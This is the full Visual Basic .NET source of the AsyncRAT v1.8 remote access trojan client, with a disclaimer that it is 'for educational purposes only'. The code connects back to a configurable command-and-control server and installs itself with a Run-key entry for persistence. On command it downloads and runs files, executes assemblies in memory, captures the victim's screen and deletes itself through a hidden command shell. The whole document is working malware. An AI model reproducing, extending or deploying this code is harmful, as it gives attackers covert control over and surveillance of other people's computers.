Imports System.Security.Cryptography
Imports Microsoft.Win32
Imports System.Management
Imports System
Imports System.Net.Sockets
Imports Microsoft.VisualBasic
Imports System.Diagnostics
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Collections.Generic
Imports System.Drawing
Imports System.Windows.Forms
Imports System.IO
Imports System.Net
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
Imports System.Threading
Imports System.Security
Imports System.Text

#Const Release = False
#Const INS = False

#If Release Then
<Assembly: AssemblyTitle("%Title%")>
<Assembly: AssemblyDescription("%Description%")>
<Assembly: AssemblyCompany("%Company%")>
<Assembly: AssemblyProduct("%Product%")>
<Assembly: AssemblyCopyright("%Copyright%")>
<Assembly: AssemblyTrademark("%Trademark%")>
<Assembly: AssemblyFileVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")>
<Assembly: AssemblyVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")>
<Assembly: Guid("%Guid%")>
#End If


'

'       │ Author     : NYAN CAT
'       │ Name       : AsyncRAT // Simple Socket

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program Is distributed for educational purposes only.

'


Namespace AsyncRAT

    Public Class Settings

#If INS Then
        Public Shared ReadOnly ClientFullPath As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.%DIR%), "%EXE%")
#End If

#If Release Then
        Public Shared ReadOnly Hosts As New Collections.Generic.List(Of String)({"%HOSTS%"})
        Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({%PORT%})
        Public Shared ReadOnly KEY As String = "%KEY%"
#Else
        Public Shared ReadOnly Hosts As New Collections.Generic.List(Of String)({"127.0.0.1"})
        Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({6603, 6604, 6605, 6606})
        Public Shared ReadOnly KEY As String = "<AsyncRAT123>"
#End If
        Public Shared ReadOnly VER As String = "AsyncRAT v1.8"
    End Class


    Public Class Program

        Public Shared isConnected As Boolean = False
        Public Shared S As Socket = Nothing
        Public Shared BufferLength As Long = Nothing
        Public Shared BufferLengthReceived As Boolean = False
        Public Shared Buffer() As Byte
        Public Shared MS As MemoryStream = Nothing
        Public Shared Tick As Threading.Timer = Nothing
        Public Shared allDone As New ManualResetEvent(False)

        Public Shared Sub Main()

            'Do Something Here..

#If INS Then
                        Install()
#End If


            While True
                Thread.Sleep(2.5 * 1000)
                If isConnected = False Then
                    isDisconnected()
                    Connect()
                End If
                allDone.WaitOne()
            End While

        End Sub

#If INS Then
        Public Shared Sub Install()
            Thread.Sleep(2 * 1000)
            Try
                If Process.GetCurrentProcess.MainModule.FileName <> Settings.ClientFullPath Then
                    For Each P As Process In Process.GetProcesses
                        Try
                            If P.MainModule.FileName = Settings.ClientFullPath Then
                                P.Kill()
                            End If
                        Catch : End Try
                    Next
                    Using Drop As New FileStream(Settings.ClientFullPath, FileMode.Create)
                        Dim Client As Byte() = File.ReadAllBytes(Process.GetCurrentProcess.MainModule.FileName)
                        Drop.Write(Client, 0, Client.Length)
                    End Using
                    Thread.Sleep(2 * 1000)
                    Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run\").SetValue(Path.GetFileName(Settings.ClientFullPath), Settings.ClientFullPath)
                    Process.Start(Settings.ClientFullPath)
                    Environment.Exit(0)
                End If
            Catch ex As Exception
                Debug.WriteLine("Install : Failed : " + ex.Message)
            End Try
        End Sub
#End If

        Public Shared Sub Connect()

            Try

                S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)

                BufferLength = 0
                Buffer = New Byte(0) {}
                MS = New MemoryStream

                S.ReceiveBufferSize = 50 * 1000
                S.SendBufferSize = 50 * 1000

                S.Connect(Settings.Hosts.Item(New Random().Next(0, Settings.Hosts.Count)), Settings.Ports.Item(New Random().Next(0, Settings.Ports.Count)))
                Debug.WriteLine("Connect : Connected")

                isConnected = True

                SendIdentification()

                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)

                Dim T As New TimerCallback(AddressOf Ping)
                Tick = New Threading.Timer(T, Nothing, 15000, 30000)
            Catch ex As Exception
                Debug.WriteLine("Connect : Failed")
                isConnected = False
            Finally
                allDone.Set()
            End Try
        End Sub

        Private Shared Sub SendIdentification()
            Dim OS As New Devices.ComputerInfo
            Dim FriendlyName As String = OS.OSFullName.Replace("Microsoft", Nothing) + " " + Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit") + " " + Environment.OSVersion.ServicePack.Replace("Service Pack", "SP")
            Send(CByte(PacketHeader.identification), GetHash(ID), Environment.UserName, FriendlyName, Settings.VER)
        End Sub

        Public Shared Sub BeginReceive(ByVal ar As IAsyncResult)
            If isConnected = False OrElse Not S.Connected Then
                Debug.WriteLine("BeginReceive : Disconnected")
                isConnected = False
                Exit Sub
            End If
            Try
                Dim Received As Integer = S.EndReceive(ar)
                If Received > 0 Then
                    If BufferLengthReceived = False Then
                        If Buffer(0) = 0 Then
                            Debug.WriteLine("BeginReceive : Got BufferLength")
                            BufferLength = BS(MS.ToArray)
                            MS.Dispose()
                            MS = New MemoryStream

                            If BufferLength = 0 Then
                                Debug.WriteLine("BeginReceive : Got BufferLength : isNothing")
                            Else
                                Buffer = New Byte(BufferLength - 1) {}
                                BufferLengthReceived = True
                            End If
                        Else
                            Debug.WriteLine("BeginReceive : Seeking BufferLength")
                            MS.WriteByte(Buffer(0))
                        End If
                    Else
                        MS.Write(Buffer, 0, Received)
                        If (MS.Length = BufferLength) Then
                            Debug.WriteLine("BeginReceive : Received Full Packet")
                            Buffer = New Byte(0) {}
                            BufferLength = 0
                            ThreadPool.QueueUserWorkItem(New WaitCallback(AddressOf Messages.Read), MS.ToArray)
                            MS.Dispose()
                            MS = New MemoryStream
                            BufferLengthReceived = False
                        Else
                            Buffer = New Byte(BufferLength - MS.Length - 1) {}
                            Debug.WriteLine("BeginReceive : Received Full Packet : NotEqual")
                        End If
                    End If
                Else
                    Debug.WriteLine("BeginReceive : Disconnected")
                    isConnected = False
                    Exit Sub
                End If
                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)
            Catch ex As Exception
                Debug.WriteLine("BeginReceive : Failed")
                isConnected = False
                Exit Sub
            End Try
        End Sub

        Public Shared Sub Send(ParamArray Msgs As Object())
            If isConnected = True OrElse S.Connected Then
                Try
                    Dim Packer As New Pack
                    Dim Data As Byte() = Packer.Serialize(Msgs)

                    Using MS As New MemoryStream
                        Dim Buffer As Byte() = AES_Encryptor(Data)
                        Dim BufferLength As Byte() = SB(Buffer.Length & CChar(vbNullChar))

                        MS.Write(BufferLength, 0, BufferLength.Length)
                        MS.Write(Buffer, 0, Buffer.Length)

                        S.Poll(-1, SelectMode.SelectWrite)
                        S.BeginSend(MS.ToArray, 0, MS.Length, SocketFlags.None, New AsyncCallback(AddressOf EndSend), Nothing)
                    End Using
                Catch ex As Exception
                    Debug.WriteLine("Send : Failed")
                    isConnected = False
                End Try
            Else
                isConnected = False
            End If
        End Sub

        Public Shared Sub EndSend(ByVal ar As IAsyncResult)
            Try
                S.EndSend(ar)
            Catch ex As Exception
                Debug.WriteLine("EndSend : Failed")
                isConnected = False
            End Try
        End Sub

        Public Shared Sub isDisconnected()

            If Tick IsNot Nothing Then
                Try
                    Tick.Dispose()
                    Tick = Nothing
                Catch ex As Exception
                    Debug.WriteLine("Tick.Dispose")
                End Try
            End If

            If MS IsNot Nothing Then
                Try
                    MS.Close()
                    MS.Dispose()
                    MS = Nothing
                Catch ex As Exception
                    Debug.WriteLine("MS.Dispose")
                End Try
            End If

            If S IsNot Nothing Then
                Try
                    S.Close()
                    S.Dispose()
                    S = Nothing
                Catch ex As Exception
                    Debug.WriteLine("S.Dispose")
                End Try
            End If


        End Sub

        Public Shared Sub Ping()
            Try
                If isConnected = True Then
                    Send(CByte(PacketHeader.Ping))
                    Debug.WriteLine("Pinged!")
                End If
            Catch ex As Exception
            End Try
        End Sub
    End Class

    Public Class Messages
        Public Shared Sub Read(ByVal Data As Byte())
            Try

                Dim Packer As New Pack
                Dim itm As Object() = Packer.Deserialize(AES_Decryptor(Data))

                Select Case itm(0)
                    Case PacketHeader.ClientShutdown
                        Try
                            Program.S.Shutdown(SocketShutdown.Both)
                            Program.S.Close()
                        Catch ex As Exception
                        End Try
                        Environment.Exit(0)

                    Case PacketHeader.ClientDelete
                        SelfDelete()

                    Case PacketHeader.ClientUpdate
                        Program.Send(CByte(PacketHeader.MsgReceived))
                        Download(itm(1), itm(2), itm(3))

                    Case PacketHeader.RemoteDesktopOpen
                        Program.Send(CByte(PacketHeader.RemoteDesktopOpen))

                    Case PacketHeader.RemoteDesktopSend
                        Capture(itm(1), itm(2))

                    Case PacketHeader.Reflection
                        Program.Send(CByte(PacketHeader.MsgReceived))
                        Reflection(itm(1))

                End Select

            Catch ex As Exception
                Program.Send(CByte(PacketHeader.ErrorMassages), ex.Message)
            End Try
        End Sub

        'Private Shared Function AsyncRatPlugin(ByVal Library As Byte())
        '    Dim Plugin As Assembly = Assembly.Load(AES_Decryptor(Library))
        '    Dim CallType = Plugin.CreateInstance("Plugin.Plugin", True)
        'End Function

        Private Shared Sub Download(ByVal Name As String, ByVal Buffer As Byte(), ByRef Update As Boolean)
            Try
                Dim Temp As String = Path.GetTempFileName + Name
                File.WriteAllBytes(Temp, AES_Decryptor(Buffer))
                Thread.Sleep(500)
                Process.Start(Temp)
                If Update Then
                    SelfDelete()
                End If
            Catch ex As Exception
                Program.Send(CByte(PacketHeader.ErrorMassages), ex.Message)
            End Try
        End Sub

        Private Shared Sub SelfDelete()
            Try
                Dim Del As New ProcessStartInfo With {
                    .Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Process.GetCurrentProcess.MainModule.FileName,
                    .WindowStyle = ProcessWindowStyle.Hidden,
                    .CreateNoWindow = True,
                    .FileName = "cmd.exe"
                    }

                Try
                    Program.S.Shutdown(SocketShutdown.Both)
                    Program.S.Close()
                Catch ex As Exception
                End Try

                Process.Start(Del)
                Environment.Exit(0)
            Catch ex As Exception
                Program.Send(CByte(PacketHeader.ErrorMassages), ex.Message)
            End Try
        End Sub

        Private Delegate Function ExecuteAssembly(ByVal sender As Object, ByVal parameters As Object()) As Object
        Private Shared Sub Reflection(ByVal buffer As Byte()) 'gigajew@hf
            Try
                Dim parameters As Object() = Nothing
                Dim assembly As Assembly = Thread.GetDomain().Load(AES_Decryptor(buffer))
                Dim entrypoint As MethodInfo = assembly.EntryPoint
                If entrypoint.GetParameters().Length > 0 Then
                    parameters = New Object() {New String() {Nothing}}
                End If

                Dim assemblyExecuteThread As Thread = New Thread(Sub()
                                                                     Thread.BeginThreadAffinity()
                                                                     Thread.BeginCriticalRegion()
                                                                     Dim executeAssembly As ExecuteAssembly = New ExecuteAssembly(AddressOf entrypoint.Invoke)
                                                                     executeAssembly(Nothing, parameters)
                                                                     Thread.EndCriticalRegion()
                                                                     Thread.EndThreadAffinity()
                                                                 End Sub)
                If parameters IsNot Nothing Then
                    If parameters.Length > 0 Then
                        assemblyExecuteThread.SetApartmentState(ApartmentState.STA)
                    Else
                        assemblyExecuteThread.SetApartmentState(ApartmentState.MTA)
                    End If
                End If

                assemblyExecuteThread.Start()
            Catch ex As Exception
                Program.Send(CByte(PacketHeader.ErrorMassages), ex.Message)
            End Try
        End Sub

        Public Shared Sync As Object = New Object
        Public Shared Sub Capture(ByVal W As Integer, ByVal H As Integer)
            SyncLock Sync

                Try
                    'Capture
                    Dim ScreenSize As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
                    Dim ImageScreenSize As Graphics = Graphics.FromImage(ScreenSize)
                    ImageScreenSize.CompositingQuality = CompositingQuality.HighSpeed
                    ImageScreenSize.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)

                    'Resize
                    Dim Resize As New Bitmap(W, H)
                    Dim ImageResize As Graphics = Graphics.FromImage(Resize)
                    ImageResize.CompositingQuality = CompositingQuality.HighSpeed
                    ImageResize.DrawImage(ScreenSize, New Rectangle(0, 0, W, H), New Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), GraphicsUnit.Pixel)

                    'compress
                    Dim encoderParameter As EncoderParameter = New EncoderParameter(Imaging.Encoder.Quality, 50)
                    Dim encoderInfo As ImageCodecInfo = GetEncoderInfo(ImageFormat.Jpeg)
                    Dim encoderParameters As EncoderParameters = New EncoderParameters(1)
                    encoderParameters.Param(0) = encoderParameter

                    Dim MS As New MemoryStream
                    Resize.Save(MS, encoderInfo, encoderParameters)

                    Program.Send(CByte(PacketHeader.RemoteDesktopSend), MS.GetBuffer)

                    Try
                        MS.Dispose()
                        ImageScreenSize.Dispose()
                        ImageResize.Dispose()
                        Resize.Dispose()
                        ScreenSize.Dispose()
                    Catch ex As Exception
                        Debug.WriteLine("Capture.Dispose" + ex.Message)
                    End Try

                Catch ex As Exception
                    Debug.WriteLine("Capture" + ex.Message)
                End Try
            End SyncLock

        End Sub

        Private Shared Function GetEncoderInfo(ByVal format As ImageFormat) As ImageCodecInfo
            Try
                Dim j As Integer
                Dim encoders() As ImageCodecInfo
                encoders = ImageCodecInfo.GetImageEncoders()

                j = 0
                While j < encoders.Length
                    If encoders(j).FormatID = format.Guid Then
                        Return encoders(j)
                    End If
                    j += 1
                End While
                Return Nothing
            Catch ex As Exception
            End Try
        End Function

    End Class

    Module Helper
        Function SB(ByVal s As String) As Byte()
            Return Encoding.UTF8.GetBytes(s)
        End Function

        Function BS(ByVal b As Byte()) As String
            Return Encoding.UTF8.GetString(b)
        End Function

        Function ID() As String
            Dim S As String = Nothing
            S += Environment.UserDomainName
            S += Environment.UserName
            S += Environment.MachineName
            Return S
        End Function

        Function GetHash(strToHash As String) As String
            Dim md5Obj As New MD5CryptoServiceProvider
            Dim bytesToHash() As Byte = Encoding.ASCII.GetBytes(strToHash)
            bytesToHash = md5Obj.ComputeHash(bytesToHash)
            Dim strResult As New StringBuilder
            For Each b As Byte In bytesToHash
                strResult.Append(b.ToString("x2"))
            Next
            Return strResult.ToString.Substring(0, 12).ToUpper
        End Function

        Function AES_Encryptor(ByVal input As Byte()) As Byte()
            Dim AES As New RijndaelManaged
            Dim Hash As New MD5CryptoServiceProvider
            Dim ciphertext As String = ""
            Try
                AES.Key = Hash.ComputeHash(SB(Settings.KEY))
                AES.Mode = CipherMode.ECB
                Dim DESEncrypter As ICryptoTransform = AES.CreateEncryptor
                Dim Buffer As Byte() = input
                Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
            Catch ex As Exception
            End Try
        End Function

        Function AES_Decryptor(ByVal input As Byte()) As Byte()
            Dim AES As New RijndaelManaged
            Dim Hash As New MD5CryptoServiceProvider
            Try
                AES.Key = Hash.ComputeHash(SB(Settings.KEY))
                AES.Mode = CipherMode.ECB
                Dim DESDecrypter As ICryptoTransform = AES.CreateDecryptor
                Dim Buffer As Byte() = input
                Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
            Catch ex As Exception
            End Try
        End Function
    End Module



    Enum PacketHeader
        identification = 0
        RemoteDesktopOpen = 1
        RemoteDesktopSend = 2
        ErrorMassages = 3
        ClientShutdown = 4
        ClientDelete = 5
        ClientUpdate = 6
        Reflection = 7
        MsgReceived = 8
        Ping = 9
    End Enum


    NotInheritable Class Pack

        Private Table As Dictionary(Of Type, Byte)
        Public Sub New()
            Table = New Dictionary(Of Type, Byte)()

            Table.Add(GetType(Boolean), 0)
            Table.Add(GetType(Byte), 1)
            Table.Add(GetType(Byte()), 2)
            Table.Add(GetType(Char), 3)
            Table.Add(GetType(Char()), 4)
            Table.Add(GetType(Decimal), 5)
            Table.Add(GetType(Double), 6)
            Table.Add(GetType(Integer), 7)
            Table.Add(GetType(Long), 8)
            Table.Add(GetType(SByte), 9)
            Table.Add(GetType(Short), 10)
            Table.Add(GetType(Single), 11)
            Table.Add(GetType(String), 12)
            Table.Add(GetType(UInteger), 13)
            Table.Add(GetType(ULong), 14)
            Table.Add(GetType(UShort), 15)
            Table.Add(GetType(DateTime), 16)
        End Sub

        Public Function Serialize(ParamArray data As Object()) As Byte()
            Dim Stream As New MemoryStream()
            Dim Writer As New BinaryWriter(Stream, Encoding.UTF8)
            Dim Current As Byte = 0

            Writer.Write(Convert.ToByte(data.Length))

            For I As Integer = 0 To data.Length - 1
                Current = Table(data(I).GetType())
                Writer.Write(Current)

                Select Case Current
                    Case 0
                        Writer.Write(DirectCast(data(I), Boolean))
                    Case 1
                        Writer.Write(DirectCast(data(I), Byte))
                    Case 2
                        Writer.Write(DirectCast(data(I), Byte()).Length)
                        Writer.Write(DirectCast(data(I), Byte()))
                    Case 3
                        Writer.Write(DirectCast(data(I), Char))
                    Case 4
                        Writer.Write(DirectCast(data(I), Char()).ToString())
                    Case 5
                        Writer.Write(DirectCast(data(I), Decimal))
                    Case 6
                        Writer.Write(DirectCast(data(I), Double))
                    Case 7
                        Writer.Write(DirectCast(data(I), Integer))
                    Case 8
                        Writer.Write(DirectCast(data(I), Long))
                    Case 9
                        Writer.Write(DirectCast(data(I), SByte))
                    Case 10
                        Writer.Write(DirectCast(data(I), Short))
                    Case 11
                        Writer.Write(DirectCast(data(I), Single))
                    Case 12
                        Writer.Write(DirectCast(data(I), String))
                    Case 13
                        Writer.Write(DirectCast(data(I), UInteger))
                    Case 14
                        Writer.Write(DirectCast(data(I), ULong))
                    Case 15
                        Writer.Write(DirectCast(data(I), UShort))
                    Case 16
                        Writer.Write(DirectCast(data(I), Date).ToBinary())
                End Select
            Next

            Writer.Close()
            Return Stream.ToArray()
        End Function

        Public Function Deserialize(data As Byte()) As Object()
            Dim Stream As New MemoryStream(data)
            Dim Reader As New BinaryReader(Stream, Encoding.UTF8)
            Dim Items As New List(Of Object)()
            Dim Current As Byte = 0
            Dim Count As Byte = Reader.ReadByte()

            For I As Integer = 0 To Count - 1
                Current = Reader.ReadByte()

                Select Case Current
                    Case 0
                        Items.Add(Reader.ReadBoolean())
                    Case 1
                        Items.Add(Reader.ReadByte())
                    Case 2
                        Items.Add(Reader.ReadBytes(Reader.ReadInt32()))
                    Case 3
                        Items.Add(Reader.ReadChar())
                    Case 4
                        Items.Add(Reader.ReadString().ToCharArray())
                    Case 5
                        Items.Add(Reader.ReadDecimal())
                    Case 6
                        Items.Add(Reader.ReadDouble())
                    Case 7
                        Items.Add(Reader.ReadInt32())
                    Case 8
                        Items.Add(Reader.ReadInt64())
                    Case 9
                        Items.Add(Reader.ReadSByte())
                    Case 10
                        Items.Add(Reader.ReadInt16())
                    Case 11
                        Items.Add(Reader.ReadSingle())
                    Case 12
                        Items.Add(Reader.ReadString())
                    Case 13
                        Items.Add(Reader.ReadUInt32())
                    Case 14
                        Items.Add(Reader.ReadUInt64())
                    Case 15
                        Items.Add(Reader.ReadUInt16())
                    Case 16
                        Items.Add(DateTime.FromBinary(Reader.ReadInt64()))
                End Select
            Next

            Reader.Close()
            Return Items.ToArray()
        End Function
    End Class

End Namespace
